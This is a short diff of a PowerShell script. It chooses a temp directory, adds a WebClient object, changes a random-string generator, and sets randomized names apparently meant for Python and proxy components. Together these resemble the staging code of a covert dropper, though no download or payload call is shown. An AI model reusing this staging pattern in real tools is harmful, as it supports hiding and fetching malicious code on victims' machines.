@@ -1,5 +1,6 @@
 $pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
 $dirq=($pth | Measure-Object -Line).Lines
+$wc = New-Object net.WebClient
 if ($dirq -eq 0) {
     $direc = $env:tmp
 }
@@ -15,11 +16,11 @@ function Get-Random-String {
     param (
         [int]$length = 32
     )
-    Write-Output ((-join (((1..9)+(11..33)+(35..57)+59+61+(64..91)+(93..123)+(125..126)) * 20 | Get-Random -Count $length | ForEach-Object {[char]$_}))|Sort-Object {Get-Random})
+    Write-Output ((-join (((32..33)+(35..38)+(40..43)+(42..57)+59+61+(64..91)+(94..123)+(125..126)) * 20 | Get-Random -Count $length | ForEach-Object {[char]$_}))|Sort-Object {Get-Random})
 }
 
-$pname = Get-Random-String
-$mname = Get-Random-String
+$pyname = $(Get-Random-String).replace("$", "`$")
+$mitname = $(Get-Random-String).replace("$", "`$")
 
 try {
     $a=python -V|Out-String
